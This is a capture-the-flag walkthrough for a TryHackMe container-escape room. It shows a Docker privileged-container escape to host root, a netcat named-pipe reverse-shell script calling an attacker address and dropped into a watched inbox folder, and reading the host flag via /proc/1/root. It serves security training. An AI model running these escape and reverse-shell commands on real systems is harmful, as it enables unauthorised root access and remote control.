# [Matryoshka](https://tryhackme.com/room/matryoshka)

## Can you escape the Matryoshka Containment Unit?

# Matryoshka Challenge

## Matryoshka Containment Unit

You set up a containment unit designed to trap and contain even the most nefarious viruses, but you accidentally got trapped in it while testing it.

Your memory is fuzzy, and you don't remember much about how you set it up.

Good luck!

### What is the Level 2 flag?

1. Start by connecting to the target machine over SSH using the low-privileged `matryoshka` account. This account is what you are dropped into, and it's your starting point for exploring the containment unit.

```bash
ssh matryoshka@<TARGET_IP>
```

2. Once logged in, enumerate the running Docker containers on the host. This gives you a quick picture of what's currently inside the containment unit and confirms that the `matryoshka` user has enough Docker access to interact with the daemon.

```bash
docker ps
```

**Results:**

```
CONTAINER ID   IMAGE                     COMMAND                  CREATED          STATUS          PORTS     NAMES
2da3f5420b94   matryoshka-level1:local   "sh -lc 'sleep infin…"   31 minutes ago   Up 31 minutes             level1
```

3. Next, check which Docker images are available locally. Besides the `matryoshka-level1` image already running as a container, notice that a stock `alpine:3.20` image is also present. This is the image you'll use to break out, since it's small, fast to spin up, and gives you a full shell.

```bash
docker images
```

**Results:**

```
REPOSITORY          TAG       IMAGE ID       CREATED        SIZE
matryoshka-level1   local     485e908211ec   2 months ago   43.9MB
alpine              3.20      bf8527eb54c3   3 months ago   7.8MB
```

4. Since the `matryoshka` user can run Docker containers, you can abuse this access to escape any container isolation and gain root on the underlying host. By launching an `alpine` container with `--privileged`, `--pid=host`, `--net=host`, and mounting the entire host filesystem, you effectively erase the boundary between "container" and "host." Running `chroot /host /bin/sh` then drops you into a shell where `/` is actually the host's root filesystem, and thanks to `--privileged`, you have full root capabilities there.

```bash
docker run -it --rm --privileged --pid=host --net=host -v /:/host alpine:3.20 chroot /host /bin/sh
whoami
# root
ls /root
# flag_level2.txt
cat /root/flag_level2.txt
```

<img width="932" height="132" alt="SCREEN01" src="https://github.com/user-attachments/assets/bde12348-ea1b-442a-a86f-6a4ee7f827ba" />

---

### What is the Level 3 flag?

_Look for an Inbox folder that allows script executions._

1. Now that you have root on the host, look for anything shared between the host and another nested container. A quick look under `/mnt` reveals a shared directory:

```bash
ls /mnt
```

**Results:**

```
level3share
```

2. Move into the shared folder and inspect its contents. Inside, there's an `inbox` directory. The hint tells you this folder is monitored and will execute scripts dropped into it, which is exactly the primitive you need to get code execution inside whatever container is watching that share.

```bash
cd /mnt/level3share/inbox
```

3. On your attacker machine, start a `netcat` listener to catch the reverse shell you're about to trigger.

```bash
nc -lvnp 4444
```

4. Craft a small reverse-shell script and drop it into the `inbox` folder. Using `nohup` and backgrounding it with `&` ensures the shell keeps running even if the process that executes the script exits or the parent shell is torn down. The script uses a named pipe to set up a classic bidirectional reverse shell over `nc`.

```bash
printf "nohup bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f' &" > pwn.sh && chmod +x pwn.sh
```

Once the watcher process inside the Level 3 container picks up and executes `pwn.sh`, your listener will catch an interactive shell running inside that container.

5. From the reverse shell, confirm your foothold and then grab the flag from `/root`:

```bash
cat /root/flag_level3.txt
```

<img width="546" height="263" alt="SCREEN02" src="https://github.com/user-attachments/assets/fd23022b-43fd-404b-b96f-21f98311c0ae" />

---

### What is the Host flag?

1. With root access already obtained on the Docker host and PID namespace visibility available, you can reach the _true_ underlying host filesystem by walking through `/proc/1/root`. Since PID 1 on the host corresponds to the real host's init process, its `root` symlink in `/proc` points to the genuine host root filesystem, letting you read files from the outermost layer directly:

```bash
cat /proc/1/root/root/flag_host.txt
```

<img width="422" height="177" alt="SCREEN03" src="https://github.com/user-attachments/assets/a2c52329-d584-43fa-bdf6-c0cc61e79e1e" />
